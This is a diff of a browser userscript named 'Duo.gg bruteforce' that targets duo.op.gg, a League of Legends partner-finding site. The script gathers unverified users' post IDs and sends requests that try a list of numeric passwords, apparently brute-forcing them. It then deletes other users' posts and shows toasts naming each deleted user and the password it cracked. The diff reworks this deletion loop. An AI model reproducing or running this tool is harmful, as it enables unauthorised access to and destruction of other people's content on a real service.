@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Duo.gg bruteforce
 // @namespace    https://github.com/HigorJardini/Manhattan-Project/
-// @version      0.6
+// @version      0.8
 // @description  op.gg
 // @author       You
 // @match        *://duo.op.gg/*/lol/
@@ -152,23 +152,31 @@ sessionStorage.setItem("deleted_accounts", JSON.stringify(deleted_array));
 var senhas = numbersArray;
 var i;
 
+async function saveUsersToDelete(ids) {
+  var users = [];
+  for(i = 0; i < ids.length; i++){
+    let name = $(`#partner-${ids[i]} > div > div > div > a`).text();
+    users.push([ids[i],name]);
+  }
+  return users
+}
+
 async function wipeDay(){
 
   var y = 0;
   const divs = document.querySelectorAll('[id^="partner-"].flex.items-center');
   const filteredDivs = Array.from(divs).filter(div => !div.textContent.includes("Verificado"));
   const numbers = Array.from(filteredDivs).map(div => div.id.match(/\d+/)[0]);
-  const uniqueNumbers = [...new Set(numbers)];
+  const deleted_users = await saveUsersToDelete([...new Set(numbers)]);
 
-  for(y = 0; y < uniqueNumbers.length; y++){
-   i = 0;
-   let name = $(`#partner-${uniqueNumbers[y]} > div > div > div > a`).text();
+  for(y = 0; y < deleted_users.length; y++){
+   var id   = deleted_users[y][0]
+   var name = deleted_users[y][1];
    await Toast.fire({
         icon: 'info',
         title: 'Deletando o usuario: ' + name
-    })
-    await httpRequest(uniqueNumbers[y], name);
-    //console.log(res);
+   })
+   await httpRequest(id, name);
   }
 
   $('#myButton').css('background-color','#e84057').prop("disabled",false);
@@ -217,7 +225,7 @@ var found = false;
         title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
        })
      } else {
-       await httpRequest(id);
+       await httpRequest(id,name);
      }
      found = kboom;
  }
